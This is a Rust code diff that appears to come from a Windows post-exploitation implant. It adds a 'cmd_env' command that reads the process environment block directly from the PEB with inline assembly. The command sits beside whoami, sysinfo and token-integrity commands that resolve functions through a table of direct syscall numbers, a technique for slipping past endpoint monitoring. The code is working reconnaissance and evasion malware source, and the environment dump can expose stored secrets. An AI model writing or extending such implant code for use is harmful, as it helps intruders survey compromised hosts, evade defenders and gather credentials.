@@ -20,6 +20,7 @@ fn wide_to_string(wide: &[u16]) -> String {
 pub unsafe fn cmd_whoami() -> Result<String, String> {
     let table = ssn_table::syscall_table();
 
+    // Username
     let username = if !table.win32.get_user_name_w.is_null() {
         type FnGetUserNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
         let func: FnGetUserNameW = core::mem::transmute(table.win32.get_user_name_w);
@@ -152,6 +153,53 @@ pub unsafe fn cmd_sysinfo() -> Result<String, String> {
     Ok(output)
 }
 
+unsafe fn cmd_env() -> Result<String, String> {
+    let peb: u64;
+    core::arch::asm!("mov {}, gs[0x60]", out(reg) peb);
+
+    // PEB.ProcessParameters at offset 0x20
+    let params = *((peb + 0x20) as *const u64);
+    if params == 0 {
+        return Err(String::from("Failed to read ProcessParameters"))
+    }
+
+    // RTL_USER_PROCESS_PARAMETERS.Environment at offset 0x80
+    let env_ptr = *((params + 0x80) as *const *const u16);
+    if env_ptr.is_null() {
+        return Err(String::from("Environment block is null"));
+    }
+
+    // Environment block: null separated KEY=VALUE pairs, double null terminated
+    let mut output = String::with_capacity(4096);
+    let mut pos: usize = 0;
+    let mut empty_count = 0;
+
+    loop {
+        let c = *env_ptr.add(pos);
+        if c == 0 {
+            empty_count += 1;
+            if empty_count >= 2 {
+                break; // Double null = end
+            }
+            output.push('\n');
+            pos += 1;
+            continue;
+        }
+        empty_count = 0;
+        output.push(if c < 128 {
+            c as u8 as char
+        } else { '?' });
+        pos += 1;
+
+        // Safety limit
+        if pos > 65536 {
+            break;
+        }
+    }
+
+    Ok(output)
+}
+
 unsafe fn query_integrity() -> &'static str {
     let table = ssn_table::syscall_table();
     if table.ssns.nt_open_process_token.ssn == 0 || table.ssns.nt_query_information_token.ssn == 0 {
@@ -208,3 +256,4 @@ unsafe fn query_integrity() -> &'static str {
         0x4000..        => "system",
     }
 }
+
